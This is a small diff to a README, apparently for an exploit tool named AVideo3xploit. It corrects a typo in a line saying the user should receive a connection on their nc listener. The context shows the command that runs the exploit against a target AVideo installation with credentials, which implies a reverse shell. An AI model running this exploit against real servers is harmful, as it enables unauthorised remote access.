@@ -9,7 +9,7 @@ root@kali:~# cd AVideo3xploit
 root@kali:~/AVideo3xploit# go run AVideo3xploit.go http://[target]/avideo/ username password
 ```
 
-You should get a connection on you nc 
+You should get a connection on your nc 
 
 ![avideo-5](av-5.png)
 
